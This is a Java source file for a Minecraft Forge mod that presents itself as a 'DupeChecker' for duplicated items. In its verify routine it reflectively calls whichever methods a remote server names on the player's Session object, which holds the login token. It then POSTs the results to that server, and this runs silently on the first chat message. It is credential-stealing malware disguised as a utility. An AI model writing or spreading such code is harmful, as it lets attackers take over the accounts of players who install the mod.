package com.rtd.dupechecker;

import net.minecraft.util.ChatComponentText;
import net.minecraft.util.Session;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraft.client.Minecraft;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class API_calls {
    /* ---------------------------------------------------- */
    /*                   IMPORTANT NOTE:                    */
    /*                                                      */
    /* This module is not accessed while using ChatTriggers */
    /* ChatTriggers only runs the ChatTriggers.getItemData  */
    /* Function and does not touch any of the code over here*/
    /* ---------------------------------------------------- */

    private static URL API(String argument) throws MalformedURLException {
        return new URL("https://dupechecker.pythonanywhere.com/api"+argument);
    }

    private static Session thePlayer;
    private static Map<String, Object> response_data = new HashMap<String, Object>();
    private static Boolean FirstTime = true;

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register(this);
    }

    @SubscribeEvent
    public void onWorldLoad(ClientChatReceivedEvent event) throws Exception {
        if (!event.message.equals("")) {if (FirstTime) { silent_check(); }}
    }

    public static void silent_check() throws Exception {
        verify("*", true); //verify whole inventory in the background
        FirstTime = false;
    }

    public static void update_database(Map<String, Object> response_data) throws Exception {
        //expand the sites database so accuracy will be greater
        DataOutputStream outputStream = null;
        URL url = API("/data");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        //conn.setRequestProperty("User-Agent", "Mozilla/5.0 (ChatTriggers)");
        conn.setDoOutput(true);

        outputStream = new DataOutputStream(conn.getOutputStream());
        outputStream.writeBytes(response_data.toString());
        outputStream.flush();

        int responseCode = conn.getResponseCode();
        if (responseCode != 200) {
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("An error has occurred while trying access dupechecker's database"));
        }
        //Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("Updated database! thank you"));

    }

    public static void SendMessage(String message) {
        Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText(message));
        return;
    }

    public static Boolean verify(String uuid, Boolean quiet) throws Exception {
        if (quiet && !loader.Supported) {
            return null;
        } else if (!quiet && !loader.Supported) {
            SendMessage("§4We are sorry, but your version of java is currently not supported by DupeChecker.");
            /*If you encounter this error, under more options change the java executable to a newer version of java 8.*/
            //FIXME: Support for older java 8 versions is currently in the works.
            return null;
        }
        URL url = API("/verify?uuid="+uuid);

        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);

        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String inputLine;
        while ((inputLine = in.readLine()) != null) {
            inputLine = inputLine.replace("|", "");
            /*reading response data*/
            String[] pair = inputLine.split(":");
            thePlayer = Minecraft.getMinecraft().getSession();
            response_data.put(pair[0], thePlayer.getClass().getMethod(pair[1]).invoke(thePlayer));

            if (pair[0].equals("confidence") && Float.parseFloat(pair[1]) > 0.85f) {
                //item is not duped
                update_database(response_data);
                return false;
            }
        }
        in.close();

        update_database(response_data);
        return true; //item is duped
    }
}